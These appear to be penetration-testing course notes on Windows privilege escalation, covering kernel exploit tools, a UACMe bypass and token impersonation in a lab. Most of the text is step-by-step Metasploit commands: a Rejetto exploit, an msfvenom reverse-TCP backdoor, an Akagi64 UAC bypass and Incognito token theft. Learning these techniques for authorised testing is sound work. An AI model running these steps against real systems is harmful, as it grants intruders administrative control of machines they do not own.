
# Windows Privilege Escalation
#### Windows Kernel Exploits:
##### Elevate privileges from one user to another, a user with administrative or root access
#### Windows Kernal
- kernel is a computer program that is the core of an operating system
- Windows NT is the kernel that comes pre-packed with all versions of Microsoft Windows
- has two main modes
	- User Mode 
	- Kernel Mode - has unrestricted access
#### Windows Kernal Exploitation
- privilege escalation on Windows systems will follow the following methodology
	- identifying Kernel vulnerabilities
	- downloading, compiling and transferring kernel exploits onto the target system
- process differs for different Windows versions
- tools
	- Windows-Exploit-Suggester
	- Windows-Kernel-Exploits
- techniques - Manually, Metasploit
- Metasploit
	- obtain a meterpreter session on your target
	- use a the suggester module to check kernel vulns
	- use an exploit
	- that is it
- Manually
	- use two previous tools

### Bypassing UAC with UACMe
- User Account Control
	- windows security feature
- Bypassing UAC
- have access to a user account that is part of local administrator group
- tools to be used depends on the version of windows running
- UACMe - tool
	- allows attackers to execute malicious payloads with administrative privileges
- Process
- `$ nmap -sV 10.10.10.10`
- `$ service postgresql start && msfconsole`
- `$ setg RHOSTS 10.10.10.10`
- `$ search rejetto``
- `$ use `
- `$ set options`
- `$ run`
- Check if the user is part of the administrator group
- `$ sysinfo`
- `$ pgrep explorer`
- `$ migrate 2448`
- `$ sysinfo`
- `$ getprivs`
- `$ shell`
- `$ net user`
- `$ net localgroup administrators`
- **using UACMe**
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=yourip LPORT=1234 -f exe > backdoor.exe`
- `msfconsole`
- `use multi/handler`
- `set payload windows/meterpreter/reverse_tcp`
- `set LHOST your IP`
- `set LPORT 1234`
- `run`
- back to first Metasploit
- `cd C:\\`
- `mkdir Temp`
- `cd Temp`
- `upload backdoor.exe`
- `upload /root/Desktop/tools/UACME/Akagi64.exe`
- `shell`
- `.\Akagi64.exe 23 C:\Temp\backdoor.exe`
- back to second Metasploit

### Access Token Impersonation
- are core element of the authentication process on windows
- are created and managed by the Local Security Authority Subsystem Service (LSASS)
- controls what users can and cannot on the system
- two types
	- Impersonate-level tokens
	- Delegate-level tokens
- privilleges are required for successful impersonation attack
	- SeAssignPrimaruToken
	- SeCreateToken
	- SelmpersonatePrivilege
- The Incognito Module
	- built-in meterpreter module
	- we use for displaying a list of available tokens that we can impersonate
- **sample process** 
- `$ nmap 10.10.10.10`
- `$ service postgresql start && msfconsole`
- `$ search rejetto`
- `$ use 0`
- `$ set options`
- `$ run`
- `$ sysinfo`
- `$ pgrep explorer`
- `$ migrate to that number`
- `$ getuid`
- `$ getprivs`
- we have the SeImpersonatePrivilege
- **using Incognito module**
- `$ load incognito`
- `$ list_tokens -u `
- `$ impersonate_token "Attackdefence\admmm...."`
- `$ getuid`
- `$ getprivs`
- `$pgrep explorer`
- `$ migrate to that number`
- `$ getuid`
- `$ getprivs`
- if you don't get the tokens, use the potato attack - will be discussed in another video
